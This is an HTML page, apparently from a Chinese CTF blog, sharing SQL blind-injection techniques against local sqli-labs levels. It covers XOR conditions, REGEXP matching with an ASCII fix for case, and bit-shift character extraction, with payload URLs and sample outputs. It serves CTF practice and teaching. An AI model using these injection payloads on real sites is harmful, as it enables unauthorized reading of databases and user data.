@@ -1,0 +1,519 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+ <meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
+<meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
+<meta HTTP-EQUIV="expires" CONTENT="0"> 
+<title>CTF_Sqlin-Tips Sharing | loecho</title>	
+
+<link rel="stylesheet" href="https://loecho.me/styles/main.css">
+<script type="text/javascript">
+function getCSS()
+{
+        datetoday = new Date();
+        timenow=datetoday.getTime();
+        datetoday.setTime(timenow);
+        thehour = datetoday.getHours();
+
+        if (thehour<0)
+
+            display = "https://loecho.me/media/css/night.css";
+
+       else if (thehour>24)
+
+            display = "https://loecho.me/media/css/night.css";   
+
+        else if (thehour>0)
+           
+            display = "https://loecho.me/media/css/day.css";
+
+        else if (thehour<24)
+
+            display = "https://loecho.me/media/css/day.css";
+      
+
+var css = '<';
+        css+='link rel="stylesheet" href='+display+' \/';
+        css+='>';
+        document.write(css);
+}
+</script>
+<link href="https://fonts.googleapis.com/css?family=Dancing+Script|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
+<link href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css" rel="stylesheet" />
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<script type='text/javascript' src='https://loecho.me/media/scripts/script.js'></script>
+<link href="https://cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet" />
+  <script src="https://cdn.bootcss.com/wow/1.1.2/wow.min.js"></script>
+  <script src="https://cdn.bootcss.com/highlight.js/9.15.8/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <script>wow=new WOW({boxClass:'wow',animateClass:'animated',offset:0,mobile:true,live:true});wow.init();</script>
+
+<script type="text/javascript">
+window.onload=getCSS();
+</script>
+
+
+ 	
+</head>
+<body class="post-template-default single single-post postid-70 single-format-standard">
+    <div id="wrapper">
+        
+			
+		<header id="header" class="site-header" 
+		
+		>
+			<div class="site-branding">
+									<h1 class="site-title"><a href="https://loecho.me" rel="home">loecho</a></h1>
+										
+					<h2 class="site-description"><h4>Red Team@loecho /CTFer@Web /SRC</h4></h2>
+										
+							</div>
+			<nav id="nav-wrapper">
+				<div class="container">
+					<div class="nav-toggle">
+						<div class="bars">
+							<div class="bar"></div>
+							<div class="bar"></div>
+							<div class="bar"></div>
+						</div>
+					</div>
+					<div class="clear"></div>
+					<ul id="" class="dove">
+		 
+
+</ul>
+</li>		
+		
+</ul>				</div>
+			</nav>
+						<div class="jingge">
+
+
+    
+
+    
+			
+<a  href="https://github.com/a1ices" target="_blank" ><i class="iconfont icon-github"></i></a>
+ 
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+			
+<a  href="1414596457" target="_blank" ><i class="iconfont icon-qq"></i></a>
+ 
+    
+
+    
+
+    
+        </header>
+
+		<div id="content" class="container">
+			<div class="row">
+	<div class="col-md-8 site-main">
+				
+<article id="post-70" class="post-70 post type-post status-publish format-standard hentry category-5 tag-10 tag-9 tag-11">
+
+	
+	                      
+		<div class="entry-content">
+			<h1 class="wow swing entry-title">CTF_Sqlin-Tips Sharing</h1>
+<div class="entry-meta">
+<div class="wow bounce">
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-17 17:33:47" itemprop="datePublished" pubdate="">2020-03-17</time></i>
+	          </div>
+			
+</span>
+													 
+		</div>
+                  
+			<div class="wow slideInLeft entry-summary song">
+				<h2 id="0x01-目的">0x01 目的</h2>
+<p>总结一下,在CTF比赛中常用的SQL盲注技巧,一直更新,目的是为了锻炼自己在比赛中,快速编写过滤字符的SQL盲注脚本,实现各种骚技巧</p>
+<h2 id="0x02-分析">0x02 分析</h2>
+<h3 id="一-异或的使用">(一 )^ 异或的使用:</h3>
+<p>mysql中实验结果:</p>
+<pre><code class="language-sql">mysql&gt; select * from user where id = 1^0;    ===&gt; 做异或运算
++----+--------+----------+
+| id | name   | password |
++----+--------+----------+
+|  1 | loecho | 123456   |
++----+--------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from user where id = 1^1; ====&gt; 做异或运算
+Empty set (0.00 sec)
+</code></pre>
+<h3 id="实际使用">实际使用:</h3>
+<p>1.其他截取方式,按照过滤规则和Fuzz结果变换<br>
+2.条件判断通过^来判断<br>
+3.编写脚本</p>
+<h4 id="实验">实验:</h4>
+<p><strong>构造Paylod:</strong></p>
+<h4 id="恒假条件">恒假条件</h4>
+<pre><code class="language-php">http://127.0.0.1:32769/Less-8/?id=1'^(length(database())&lt;0)^'--+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2020/03/17/C6S5ewW8MtNGlRv.png" alt="" loading="lazy"></figure>
+<h4 id="恒真条件">恒真条件</h4>
+<pre><code class="language-php">http://127.0.0.1:32769/Less-8/?id=1'^(length(database())&gt;0)^'--+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2020/03/17/5xw6X8KizysvNSr.png" alt="" loading="lazy"></figure>
+<p><strong>脚本编写:</strong><br>
+1.条件判断为,不存在标志为真,反之为假<br>
+2.Payload构造</p>
+<pre><code class="language-php">http://127.0.0.1:32769/Less-8/?id=1'^(ascii(substr(database(),1,1))='115')^'--
+</code></pre>
+<p><strong>脚本如下:</strong></p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2020/03/17/iMc48tBYOaFzA3N.png" alt="" loading="lazy"></figure>
+<p><strong>运行结果:</strong></p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2020/03/17/PNhAMX9wImKdycB.png" alt="" loading="lazy"></figure>
+<h3 id="二-正则regexp函数">(二) 正则Regexp函数:</h3>
+<p>mysql 中的正则有三种常用的方式 like 、rlike 和 regexp ，其中 Like 是精确匹配，而 rlike 和 regexp 是模糊匹配(只要正则能满足匹配字符串的子字符串就成立为真!)</p>
+<p>当然他们所使用的通配符略有差异：</p>
+<p><strong>(1)like 常用通配符：% 、_ 、escape</strong></p>
+<pre><code>% : 匹配0个或任意多个字符
+
+_ : 匹配任意一个字符
+
+escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE '/%/_%_' ESCAPE'/'
+</code></pre>
+<p><em><em>(2)rlike和regexp:常用通配符：. 、</em> 、 [] 、 ^ 、 $ 、{n}</em>*</p>
+<pre><code>. : 匹配任意单个字符
+* ： 匹配0个或多个前一个得到的字符
+
+[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。
+
+^ : 匹配开头，如^s匹配以s或者S开头的字符串。
+
+$ : 匹配结尾，如s$匹配以s结尾的字符串。
+
+{n} : 匹配前一个字符反复n次。
+</code></pre>
+<h3 id="实验-2">实验:</h3>
+<p><strong>1.库名为: security</strong><br>
+<strong>2.Mid,substr 都可以截取</strong></p>
+<p><strong>为了显示清楚,就不那数据库演示了,使用SQL-lab的第二关,可以联合查询的关卡,演示</strong></p>
+<p><strong>构造Payload如下,2,3为显示位数:</strong></p>
+<p><strong>http://192.168.0.108:88/Less-2/?id=-1 union select 1,2,3--+</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2020/03/18/CkvWP5FBlpYX1mD.png" alt="" loading="lazy"></figure>
+<p><strong>在显示为上操作,截取第一位字母,为s:</strong></p>
+<p><strong>http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1),3--+</strong><br>
+<img src="https://i.loli.net/2020/03/18/9hEe1LZkOKAznic.png" alt="" loading="lazy"></p>
+<p>配合正则来判断,现在是有显示情况,但是没有显示时,我们在只能利用盲注是来判断真假,</p>
+<p>在我们知道条件下,构造一个为真的条件,看返回(判断第一位是否为s),返回1说名为真!:</p>
+<p><strong>http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1) regexp '^s',3--+</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2020/03/18/OSyq8h5inbVpLW1.png" alt="" loading="lazy"></figure>
+<p>构造个假的来看,返回为0:</p>
+<p><strong>http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1) regexp '^a',3--+</strong></p>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2020/03/18/KObRtSv7wszgDyB.png" alt="" loading="lazy"></figure>
+<p>通过上面实验我们就可以,来构造我们的脚本啦<br>
+但是在我测试过程中,还发现一个点,正则判断是时大小写是不敏感的,什么意思那,就是现在已知我们的库名为<strong>security</strong>,第一位为小写<strong>s</strong>,正则设置为 <code>^'S'</code> ,大写S,还是会返回真</p>
+<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2020/03/18/3OhnlHgoBr2cMby.png" alt="" loading="lazy"></figure>
+<p>想了个解决办法就是加Ascii函数,转为ascii码值在比较,因为ascii码对应字母大小写</p>
+<p>我们为了提交注入效率,要利用到二分的想法.</p>
+<p><strong>1.把数据按位截取,确定范围,可以通过正则来大致判断(看是否为0-9,a-z)</strong><br>
+<strong>2.确定了大范围后,就可以从小范围中,利用二分法来读取数据</strong><br>
+<strong>3.实际情况,变换截取方式,总的方法还是不变</strong></p>
+<p>提取数据方式:</p>
+<pre><code class="language-python">
+and 1=(mid(database(),{},1) regexp '^{}')--+
+
+</code></pre>
+<p>脚本实现:</p>
+<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2020/03/18/6hHjambzYGguFkI.png" alt="" loading="lazy"></figure>
+<p>考虑大小写问题,为了看效果,我们查看一下数据库路径(里面包含大小写特殊符号),最终Payload:</p>
+<pre><code>and 1=(ascii((mid(@@datadir,{},1)) regexp '^{}')--+
+
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2020/03/18/w8OE9bg5YRGn4eL.png" alt="" loading="lazy"></figure>
+<h3 id="三-利用移位符号">(三) 利用移位符号  &gt;&gt;</h3>
+<p>效率相对于其他盲注来说,是最高的.基本原理,以为字母可以转换为八位的二进制说,在SQL注入中,我们诸位截取字符串,转为二进制数在进行诸位判断,每个字符串最多查询八次就会得到数据,分析如下:</p>
+<p>比如查询一个 库名 :  <code>LoEcH0</code> 的数据库名,普通盲注,我们获取到库名长度后,按照每位查询.</p>
+<p>先贴上Ascii码表,可显字符(标记十进制:):</p>
+<figure data-type="image" tabindex="11"><img src="https://i.loli.net/2020/03/19/786pYm2fXODIySM.png" alt="" loading="lazy"></figure>
+<p><code>L</code> :   ascii码值(十进制):   <strong>76</strong>         次数:  32~76    =   <strong>44</strong><br>
+<code>o</code> :   ascii码值(十进制):  <strong>111</strong>        次数: 32~111   = <strong>79</strong><br>
+<code>E</code> :   ascii码值(十进制):   <strong>69</strong>         次数:  32~69    =   <strong>37</strong><br>
+<code>c</code> :   ascii码值(十进制):   <strong>99</strong>         次数:   32~99    =  <strong>67</strong><br>
+<code>H</code> :  ascii码值(十进制):   <strong>72</strong>          次数:   32~72    =  <strong>40</strong><br>
+<code>0</code>  :  ascii码值(十进制):   <strong>48</strong>          次数:   32~99     = <strong>67</strong></p>
+<p>而对应通过二进制查询,每位最多查8次就找到字符,<code>DB_Length x 8= 8*Length</code> 次,这是最多查询次数,实际次数是要小于这个次数的.</p>
+<p>通过这个想法来构造Payload</p>
+<p>已知: <strong>user() = root@localhost</strong></p>
+<figure data-type="image" tabindex="12"><img src="https://i.loli.net/2020/03/19/naQxNXBKW59Splo.png" alt="" loading="lazy"></figure>
+<p>第一位 <code>r</code> 二进制: 01110010 ,Payload是截取第一位字母转为二进制右移 <code>7</code>位,后面 = 0 为真,结果如下:</p>
+<p><strong>为真条件:(1=1 为真 )</strong></p>
+<pre><code>http://localhost:88/Less-2/?id=-1 union select 1,(ascii(mid(user(),1,1)) &gt;&gt; 7 )=0,user()--+
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://i.loli.net/2020/03/19/wVRxHSkrLy3BjDv.png" alt="" loading="lazy"></figure>
+<p><strong>为假条件(1 = 0 为假)</strong></p>
+<pre><code>http://localhost:88/Less-2/?id=-1 union select 1,(ascii(mid(user(),1,1)) &gt;&gt; 7 )=0,user()--+
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://i.loli.net/2020/03/19/LjOriKegzGd2JAY.png" alt="" loading="lazy"></figure>
+<p><strong>盲注标记测试:</strong></p>
+<p><strong>条件为真,返回标记(You are in.......):</strong></p>
+<pre><code>http://localhost:88/Less-8/?id=1' and (ascii(mid(user(),1,1)) &gt;&gt; 7 )=0--+
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://i.loli.net/2020/03/19/tQj6O7KUDHrZPxy.png" alt="" loading="lazy"></figure>
+<p><strong>条件为假,不返回标记:</strong></p>
+<pre><code>http://localhost:88/Less-8/?id=1' and (ascii(mid(user(),1,1)) &gt;&gt; 7 )=1--+
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://i.loli.net/2020/03/19/BmQYvpleKOIS48H.png" alt="" loading="lazy"></figure>
+<h4 id="通过得到结果构造payload写脚本直接看大佬博客吧有现成的">通过得到结果,构造Payload,写脚本,直接看大佬博客吧,有现成的!:</h4>
+<p><strong>链接在这:</strong><br>
+https://phpinfo.me/2015/08/30/1026.html</p>
+<h2 id="继续更新">继续更新....</h2>
+
+							</div>
+	<div class="wow bounceInDown vt-post-tags">
+ 
+					</div>						
+<nav class="navigation3 post-navigation3" role="navigation">
+		
+		<div class="nav-links3">
+      
+		<div class="wow bounceInLeft nav-previous3"><a href="https://loecho.me/G9StXUF8l/" rel="prev"> SQLi_ByPass-WaF_FUZZ-Tips 分享</a></div>
+		 
+		 
+		<div class="wow bounceInRight nav-next3"><a href="https://loecho.me/FtRTsYiXp/" rel="next"> 实验吧CTF_SQL盲注Writeup</a></div>
+		
+		</div>
+	</nav>
+	<div class="wow rollIn author-info" style="visibility: visible; animation-name: rollIn;">
+	<div class="author-avatar pull-left"><img src="https://loecho.me/images/avatar.png" ></div>
+ 
+	<div class="author-description"><div class="author-title"><div class="author-link" rel="author">Loecho</div></div>
+
+
+	<p class="author-bio">Red Team@loecho /CTFer@Web /SRC</p></div></div>
+	
+		</div>
+		
+ 
+		
+</article>
+
+<div id="marlin_lite_about_widget-2" class="wow bounceInUp widget marlin_lite_about_widget" data-wow-delay="0.1s">
+		
+        
+		<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://loecho.me/media/scripts/Valine.min.js'></script>
+
+<div class="comment"></div>
+<script>
+        new Valine({
+            // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+            av: AV, 
+            el: '.comment',
+            lang: 'zh-cn',
+            
+            admin_email:'1414596457@qq.com',
+            
+            
+      emoticon_list: ["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
+     	
+      	
+          
+      placeholder: '欢迎质疑'
+       
+        });
+    </script> 
+
+
+   
+  
+ 
+
+		</div>
+
+			</div>
+			
+
+
+<div class="tocc col l3 hide-on-med-and-down">
+	
+        <div class="toc-widget">
+			
+            <div class="toc-title"></div>
+			
+            <div id="toc-content">
+			
+			
+			</div>
+        </div>
+    </div>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.5.0/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '.entry-summary',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('.entry-summary').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>										 
+
+ 
+       
+
+
+			</div>
+		</div>
+
+		
+		 	<footer id="colophon" class="site-footer">
+
+			<div class="container">
+	
+				<div class="copyright"><a>Red Team@loecho /CTFer@Web /SRC </a><br>Theme:   <a href="https://github.com/shanbufun/gridea-theme-pan" target="_blank" title="Pan"><span>Pan</span></a>.  by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >Shanbufun</a></div>		
+			</div>
+		
+		</footer>
+
+</div>
+
+<script src="https://cdn.bootcss.com/fitvids/1.2.0/jquery.fitvids.min.js"></script>
+<script type='text/javascript' src='https://loecho.me/media/scripts/marlin-scripts.js'></script>
+ <script src="//tokinx.github.io/lately/lately.min.js"></script>
+  <script>jQuery(document).ready(function(){$.lately({'target':'.lately-a,.lately-b,.lately-c'})});</script>
+  <style type="text/css">a.back_to_top {
+    text-decoration: none;
+    position: fixed;
+    bottom: 40px;
+    right: 30px;
+    background: #f0f0f0;
+    height: 40px;
+    width: 40px;
+    border-radius: 50%;
+    line-height: 36px;
+    font-size: 18px;
+    text-align: center;
+    transition-duration: .5s;
+    transition-propety: background-color;
+    display: none;
+}
+
+a.back_to_top span {
+    color: #888;
+}
+
+a.back_to_top:hover {
+    cursor: pointer;
+    background: #dfdfdf;
+}
+
+a.back_to_top:hover span {
+    color: #555;
+}
+
+@media print, screen and (max-width: 580px) {
+    .back_to_top {
+        display: none !important;
+    }
+}
+
+
+
+</style><a id="back_to_top" href="#" class="back_to_top"><span><i class="iconfont icon-xiangshang"></i></span>
+</a>
+
+
+<script>$(document).ready((function(_this) {
+  return function() {
+    var bt;
+    bt = $('#back_to_top');
+    if ($(document).width() > 480) {
+      $(window).scroll(function() {
+        var st;
+        st = $(window).scrollTop();
+        if (st > 30) {
+          return bt.css('display', 'block');
+        } else {
+          return bt.css('display', 'none');
+        }
+      });
+      return bt.click(function() {
+        $('body,html').animate({
+          scrollTop: 0
+        }, 800);
+        return false;
+      });
+    }
+  };
+})(this));
+</script>
+
+		<script data-no-instant>
+    (function ($) {
+        $.extend({
+            adamsOverload: function () {
+                $('.navigation:eq(0)').remove();
+                $("").attr("rel" , "external");
+                $("a[rel='external'],a[rel='external nofollow']").attr("target","_blank");
+                $("a.vi").attr("rel" , "");
+                $.viewImage({
+                    'target'  : 'img',
+                    'exclude' : '.vsmile-icons img,.gallery img',
+                    'delay'   : 300
+                });
+                $.lately({
+                    'target' : '.commentmetadata a,.infos time,.post-list time'
+                });
+                prettyPrint();
+                
+                $('ul.links li a').each(function(){
+                    if($(this).parent().find('.bg').length==0){
+                        $(this).parent().append('<!---<div class="bg" style="background-image:url(https://c3.glgoo.top/s2/favicons?domain='+$(this).attr("href")+')"></div>--->')
+                    }
+                });
+            }
+        });
+    })(jQuery);
+    jQuery.adamsOverload();
+</script>
+
+</body>
+</html>
